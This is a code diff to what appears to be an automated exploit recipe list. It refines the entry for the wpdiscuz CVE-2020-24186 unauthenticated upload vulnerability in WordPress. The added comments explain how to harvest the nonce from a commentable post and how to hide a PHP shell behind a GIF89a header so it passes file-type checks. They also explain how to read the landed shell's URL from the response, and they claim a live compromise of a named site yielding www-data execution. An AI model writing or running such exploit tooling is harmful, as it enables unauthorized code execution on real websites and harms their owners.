@@ -17,25 +17,33 @@ RECIPES = [
         "plugin": "wpdiscuz",
         "cve": "CVE-2020-24186",
         "affected": ">=7.0.0,<=7.0.4",
+        "mode": "comment-image-upload",
         "method": "POST",
         "endpoint": "/wp-admin/admin-ajax.php",
         "params": {"action": "wmuUploadFiles"},
         "field": "wmu_files[0]",
-        "upload_path": "/wp-content/uploads/{filename}",
-        # wmuUploadFiles is gated by check_ajax_referer() -- confirmed live: an
-        # empty/missing nonce gets rejected with WP's own wp_die(-1, 403), not
-        # a plugin-specific error. The real nonce is wp_create_nonce()'d into
-        # wpdiscuzAjaxObj.wmuSecurity via wp_localize_script wherever wpdiscuz's
-        # comment form renders (any post/page with comments open). Default
-        # harvest page is the homepage; on sites with a static front page
-        # (no post listing there), point 'url' at an actual single-post
-        # permalink instead.
+        # No upload_path: wpdiscuz stores at /uploads/YYYY/MM/<name>-<microtime>.php
+        # (unguessable). The handler reads the real URL back out of the JSON
+        # response (data.previewsData.images[].url) instead of templating a path.
+        #
+        # LIVE-VERIFIED end-to-end (georgeagent.com, wpdiscuz 7.0.4 → uid=33
+        # www-data). Three things a naive raw upload gets wrong, all handled by
+        # mode "comment-image-upload":
+        #   1. wmuSecurity is wp_create_nonce()'d into the localized JS only where
+        #      the comment form renders. On a static front page '/' has none, so
+        #      the handler discovers a commentable post (wp-json) and harvests
+        #      there. A nonce-less request is rejected -1/403 by check_ajax_referer.
+        #   2. wpdiscuz content-inspects the file (getimagesize/finfo): a bare
+        #      <?php blob returns 'Not allowed file type'. The handler leads the
+        #      payload with a GIF89a header; the .php name is kept so it executes.
+        #   3. The real landed path is parsed from the response, never guessed.
         "nonce_from": {"url": "/", "key": "wmuSecurity", "param": "wmu_nonce"},
         "source": "registry",
-        "note": "wmuUploadFiles trusts forged mime-type; drops PHP into uploads/. "
-                "Needs a real wmuSecurity nonce harvested from a page where "
-                "wpdiscuz's comment form renders -- an empty nonce is rejected "
-                "outright by check_ajax_referer().",
+        "note": "wmuUploadFiles accepts an image-headed .php once given a real "
+                "wmuSecurity nonce (harvested from a post where the comment form "
+                "renders, not a static front page); the shell lands at an "
+                "unguessable /uploads/YYYY/MM/ path read back from the JSON reply. "
+                "Confirmed live: uid=33(www-data) on wpdiscuz 7.0.4.",
     },
     {
         "plugin": "revslider",
